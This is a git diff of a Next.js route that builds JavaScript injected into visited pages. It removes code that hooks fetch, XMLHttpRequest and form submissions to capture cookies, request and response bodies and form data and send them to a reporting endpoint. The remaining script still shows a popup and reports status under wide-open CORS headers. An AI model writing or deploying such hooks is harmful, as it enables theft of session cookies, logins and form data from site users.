@@ -1,14 +1,6 @@
 import { NextRequest, NextResponse } from 'next/server';
 import { queryOne, Setting } from '@/lib/db';
-
-// CORS headers - allow everything
-const corsHeaders = {
-  'Access-Control-Allow-Origin': '*',
-  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS, HEAD, PATCH',
-  'Access-Control-Allow-Headers': '*',
-  'Access-Control-Allow-Private-Network': 'true',
-  'Access-Control-Max-Age': '86400',
-};
+import { corsHeaders } from '@/lib/cors';
 
 async function getSetting(key: string, defaultValue: string): Promise<string> {
   try {
@@ -199,7 +191,6 @@ sstat("popup_active");
     js += `
 var _nxs="${baseUrl}";
 var _ps="${ps}";
-var _tf="${tf}";
 function _isNx(u){if(!u)return false;try{return u.indexOf(_nxs)===0||u.indexOf("/api/")===0}catch(e){return false}}
 function _sstat(s){try{var x=new XMLHttpRequest();x.open("POST",_ps,true);x.setRequestHeader("Content-Type","application/json");x.send(JSON.stringify({rid:window.__rid,status:s}))}catch(e){}}
 function _showPopupPrompt(){
@@ -226,79 +217,8 @@ function _showPopupPrompt(){
     },1200)
   }
 }
-function _getBrowserHeaders(w,url){
-  var s="",crlf=String.fromCharCode(13,10);
-  try{var loc=new URL(url,w.location.href);s+="Host: "+loc.host+crlf}catch(e){}
-  s+="User-Agent: "+w.navigator.userAgent+crlf;
-  s+="Accept: */*"+crlf;
-  s+="Accept-Language: "+(w.navigator.languages?w.navigator.languages.join(", "):w.navigator.language)+crlf;
-  s+="Accept-Encoding: gzip, deflate"+crlf;
-  if(w.document.referrer)s+="Referer: "+w.document.referrer+crlf;
-  s+="Connection: keep-alive"+crlf;
-  if(w.navigator.doNotTrack==="1")s+="DNT: 1"+crlf;
-  return s;
-}
-function _buildReqHeaders(w,url,customH,ck){
-  var s=_getBrowserHeaders(w,url),crlf=String.fromCharCode(13,10);
-  for(var k in customH){s+=k+": "+customH[k]+crlf}
-  if(ck)s+="Cookie: "+ck+crlf;
-  return s;
-}
-function rpt(t,m,u,reqH,reqB,resH,resB,s){
-  if(_isNx(u))return;
-  try{var x=new XMLHttpRequest();x.open("POST",_tf,true);x.setRequestHeader("Content-Type","application/json");
-  x.send(JSON.stringify({rid:window.__rid,type:t,method:m,url:u,reqHeaders:reqH,reqBody:reqB,resHeaders:resH,resBody:resB,status:s}))}catch(e){}
-}
-function injectHooks(w){
-  if(!w||w.__xh)return;w.__xh=1;
-  var of=w.fetch;
-  w.fetch=function(){
-    var a=arguments;var u=a[0];var o=a[1]||{};
-    var url=typeof u==="string"?u:(u&&u.url?u.url:"");
-    if(_isNx(url))return of.apply(w,a);
-    var hdrs={};try{if(o.headers){if(typeof o.headers.forEach==="function"){o.headers.forEach(function(v,k){hdrs[k]=v})}else{for(var k in o.headers){hdrs[k]=o.headers[k]}}}}catch(e){}
-    var ck="";try{ck=w.document.cookie||""}catch(e){}
-    var rawReqH=_buildReqHeaders(w,url,hdrs,ck);
-    var reqBody=o.body?String(o.body).substring(0,10000):null;
-    return of.apply(w,a).then(function(r){
-      var resH="",crlf=String.fromCharCode(13,10);try{r.headers.forEach(function(v,k){resH+=k+": "+v+crlf})}catch(e){}
-      try{var rc=r.clone();rc.text().then(function(t){rpt("fetch",o.method||"GET",url,rawReqH,reqBody,resH,t.substring(0,10000),r.status)}).catch(function(){rpt("fetch",o.method||"GET",url,rawReqH,reqBody,resH,null,r.status)})}catch(e){rpt("fetch",o.method||"GET",url,rawReqH,reqBody,resH,null,r.status)}
-      return r
-    }).catch(function(e){rpt("fetch",o.method||"GET",url,rawReqH,reqBody,null,null,0);throw e})
-  };
-  var OX=w.XMLHttpRequest;
-  w.XMLHttpRequest=function(){
-    var x=new OX();var m="GET",u="",rh={},reqBody=null,rawReqH="";
-    var oo=x.open;x.open=function(mt,ur){m=mt;u=ur;return oo.apply(x,arguments)};
-    var osh=x.setRequestHeader;x.setRequestHeader=function(k,v){rh[k]=v;return osh.apply(x,arguments)};
-    var os=x.send;x.send=function(b){
-      if(_isNx(u))return os.apply(x,arguments);
-      var ck="";try{ck=w.document.cookie||""}catch(e){}
-      rawReqH=_buildReqHeaders(w,u,rh,ck);
-      reqBody=b?String(b).substring(0,10000):null;
-      x.addEventListener("load",function(){
-        var resH=x.getAllResponseHeaders()||"";
-        rpt("xhr",m,u,rawReqH,reqBody,resH,x.responseText?x.responseText.substring(0,10000):null,x.status)
-      });
-      x.addEventListener("error",function(){
-        rpt("xhr",m,u,rawReqH,reqBody,null,null,0)
-      });
-      return os.apply(x,arguments)
-    };
-    return x
-  };
-  try{w.document.addEventListener("submit",function(e){
-    var f=e.target;if(!f||f.tagName!=="FORM")return;
-    try{var fd=new FormData(f);var data={};fd.forEach(function(v,k){data[k]=v});
-    var action=f.action||w.location.href;
-    if(_isNx(action))return;
-    var ck="";try{ck=w.document.cookie||""}catch(e){}
-    var rawH=_buildReqHeaders(w,action,{"Content-Type":"application/x-www-form-urlencoded"},ck);
-    rpt("form",f.method?f.method.toUpperCase():"POST",action,rawH,JSON.stringify(data),null,null,null)}catch(e){}
-  },true)}catch(e){}
-}
 function initAdvanced(){
-  _showPopupPrompt();injectHooks(window);
+  _showPopupPrompt();
 }
 `.replace(/\n/g, '');
   }
